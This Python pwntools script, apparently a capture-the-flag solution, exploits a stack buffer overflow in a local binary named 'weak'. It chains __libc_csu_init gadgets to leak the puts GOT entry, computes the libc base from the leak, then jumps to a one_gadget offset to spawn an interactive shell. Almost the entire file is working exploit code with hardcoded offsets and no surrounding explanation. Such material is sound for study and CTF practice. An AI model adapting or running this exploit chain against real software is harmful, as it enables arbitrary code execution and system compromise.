#!/usr/bin/python
"""
0x0000000000400620 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
0x0000000000400637 : mov ebx, dword ptr [rsp + 8] ; mov rbp, qword ptr [rsp + 0x10] ; mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
"""
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process("./weak")
e = ELF("./weak")

put_got = e.got['puts']
put_plt = e.plt['puts']
main_addr = e.symbols['main']

payload = 'A' * 0x18
payload += p64(0x400637)
payload += 'A' * 0x8
payload += p64(0) # ebx
payload += p64(1) # rbp
payload += p64(put_got) # r12
payload += p64(put_got) # r13
payload += 'A' * 8 # r14
payload += 'A' * 8 # r15
payload += p64(0x400620)
payload += p64(main_addr) * 10 # So far from rsp

# gdb.attach(p, 'b *0x0000000000400620')
# raw_input()

p.sendlineafter('president.\n', payload)
p.recvuntil("!\n")
leak = p.recvuntil("\n")
libc_base = u64(leak[:-1] + '\x00' * (8 - len(leak[:-1]))) - 0x0809c0

payload = 'A' * 0x18
payload += p64(libc_base + 0x10a38c)
payload += p64(0) * 0x100
p.sendlineafter("president.\n", payload)

p.interactive()